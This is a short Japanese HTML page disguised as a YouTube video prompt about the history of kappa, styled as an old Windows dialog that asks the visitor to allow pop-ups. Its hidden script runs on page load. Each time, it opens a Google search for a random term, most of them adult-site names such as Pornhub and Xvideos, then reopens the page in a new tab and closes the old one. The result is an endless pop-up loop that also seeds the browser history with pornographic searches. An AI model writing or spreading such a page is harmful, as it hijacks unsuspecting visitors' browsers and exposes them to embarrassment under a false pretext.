<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">

<title>河童の歴史-Youtube</title>

<style>
*{
    box-sizing:border-box;
    -webkit-tap-highlight-color:transparent;
}

body{
    margin:0;
    min-height:100vh;

    display:flex;
    justify-content:center;
    align-items:center;

    padding:
        max(12px, env(safe-area-inset-top))
        12px
        max(12px, env(safe-area-inset-bottom));

    background:#008080;

    font-family:
        "MS UI Gothic",
        "MS PGothic",
        sans-serif;

    overflow:hidden;
}

.window{
    width:100%;
    max-width:430px;

    background:#c0c0c0;

    border-top:2px solid #ffffff;
    border-left:2px solid #ffffff;
    border-right:2px solid #000000;
    border-bottom:2px solid #000000;

    box-shadow:6px 6px 0 rgba(0,0,0,0.25);
}

.titlebar{
    height:32px;

    background:
        linear-gradient(
            to right,
            #000080,
            #1084d0
        );

    color:white;

    display:flex;
    align-items:center;

    padding:0 10px;

    font-size:14px;
    font-weight:bold;

    user-select:none;
}

.content{
    padding:28px 18px;

    text-align:center;
    color:black;
}

h1{
    margin:0;

    font-size:clamp(24px,7vw,34px);

    font-weight:normal;
    line-height:1.4;

    word-break:keep-all;
}

.text{
    margin-top:18px;

    font-size:clamp(15px,4.2vw,20px);

    line-height:1.6;
}

@media (max-width:480px){

    .window{
        max-width:none;
    }

    .content{
        padding:24px 14px;
    }

    .titlebar{
        font-size:13px;
    }
}
</style>
</head>
<body>

<div class="window">

    <div class="titlebar">
        河童の歴史-Youtube
    </div>

    <div class="content">

        <h1>
            河童の歴史を<br>
            視聴されますか?
        </h1>

        <div class="text">
            ポップアップを許可してください。
        </div>

    </div>

</div>

<script>
const words = [
    "Xvideos",
    "Fanza",
    "FanzaGames",
    "Pornhub",
    "MissAV",
    "エロサイト",
    "ヌード",
    "マナイス",
    "宇宙",
    "河童"
];

requestAnimationFrame(() => {

    setTimeout(() => {

        const word =
            words[Math.floor(Math.random() * words.length)];

        const searchUrl =
            "https://www.google.com/search?q=" +
            encodeURIComponent(word);

        window.open(searchUrl, "_blank");

        window.open(location.href, "_blank");

        window.close();

    }, 200);

});
</script>

</body>
</html>
